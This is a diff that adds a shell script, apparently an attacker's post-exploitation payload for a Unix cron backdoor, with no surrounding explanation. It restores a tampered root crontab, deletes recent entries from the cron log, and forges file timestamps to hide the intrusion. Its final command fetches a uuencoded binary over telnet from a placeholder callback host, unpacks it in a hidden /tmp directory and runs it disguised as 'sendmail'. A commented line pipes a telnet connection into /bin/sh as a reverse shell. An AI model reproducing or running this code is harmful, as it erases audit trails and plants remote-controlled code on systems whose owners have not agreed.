@@ -1,0 +1,42 @@
+# Add your commands after the cleanup
+if [ -f  /var/spool/cron/crontabs/root ]; then
+  mv -f /var/spool/cron/crontabs/root.bak /var/spool/cron/crontabs/root
+  rm -f /var/spool/cron/crontabs/root.orig 
+  touch -r /var/spool/cron/crontabs/root /var/spool/cron/crontabs
+  printf 'caroot\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0'  > /etc/cron.d/FIFO
+fi
+
+if [ -f /var/cron/log ]; then
+  touch -r /var/cron /tmp/.af1221
+  i=`wc -l /var/cron/log |awk '{print $1}'`
+  i=`expr $i - 3`
+  head -$i /var/cron/log > /var/cron/bak
+  mv -f /var/cron/bak /var/cron/log
+  chmod 600 /var/cron/log
+  chown root:root /var/cron/log
+  i=`tail -1 /var/cron/log`
+  i=`echo $i | sed s/Jan/01/`
+  i=`echo $i | sed s/Feb/02/`
+  i=`echo $i | sed s/Mar/03/`
+  i=`echo $i | sed s/Apr/04/`
+  i=`echo $i | sed s/May/05/`
+  i=`echo $i | sed s/Jun/06/`
+  i=`echo $i | sed s/Jul/07/`
+  i=`echo $i | sed s/Aug/08/`
+  i=`echo $i | sed s/Sep/09/`
+  i=`echo $i | sed s/Oct/10/`
+  i=`echo $i | sed s/Nov/11/`
+  i=`echo $i | sed s/Dec/12/`
+  y=`echo $i|cut -d' ' -f9`
+  y=`echo $y | cut -b3-4`
+  i=`echo $i | tr ':' ' '`
+  i=`echo $i | cut -d' ' -f6-9|tr -d ' :'`
+  touch $i$y /var/cron/log
+  touch -r /tmp/.af1221 /var/cron
+  touch  $i$y /etc/cron.d/FIFO
+fi
+rm -f /tmp/.af1221
+
+# -- Add your commands here:
+mkdir /tmp/.scsi;cd /tmp/.scsi && telnet LOCAL_IP CALLBACK_PORT < /dev/console |uudecode > /dev/null 2>&1 && uncompress -f sendmail.Z && chmod 0700 sendmail && PATH=/tmp/.scsi sendmail
+#TERM=vt100;export TERM;telnet 555.1.2.150 2525 2>&1 < /dev/console | /bin/sh 2>&1 | telnet 555.1.2.150 8080 2>&1
